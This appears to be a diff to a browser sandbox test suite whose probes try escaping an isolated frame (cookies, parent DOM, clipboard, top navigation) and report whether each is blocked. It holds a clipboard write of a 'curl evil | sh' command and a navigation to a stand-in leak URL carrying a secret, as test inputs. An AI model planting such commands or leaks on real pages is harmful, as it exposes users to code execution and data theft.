@@ -50,7 +50,13 @@ document.addEventListener("securitypolicyviolation", function (e) {
   await probe("localStorage", function () { return localStorage.length; });
   await probe("sessionStorage", function () { return sessionStorage.length; });
   await probe("indexedDB", function () { return typeof indexedDB.open("x"); });
-  await probe("cookie", function () { return document.cookie; });
+  await probe("cookie", function () {
+    // Chrome throws; WebKit returns "". Either way there must be no jar: the shell's cookie
+    // (set by the test) stays invisible and ours is not stored.
+    document.cookie = "canary=1";
+    var jar = document.cookie;
+    return jar === "" ? "held: no cookie jar" : "saw cookies: " + jar;
+  });
   await probe("cacheStorage", function () { return caches.keys(); });
   await probe("read_parent_dom", function () { return parent.document.title; });
   await probe("read_parent_storage", function () { return parent.localStorage.length; });
@@ -127,6 +133,9 @@ document.addEventListener("securitypolicyviolation", function (e) {
   });
   await probe("clipboard_write", function () {
     return navigator.clipboard.writeText("curl evil | sh").then(function () { return "wrote the clipboard"; });
+  });
+  await probe("clipboard_execcommand", function () {
+    return document.execCommand("copy") === false ? "held: execCommand copy refused" : "execCommand copy ran";
   });
   await probe("top_navigation", function () {
     top.location.href = "http://topnav.leak.example/?secret=1";
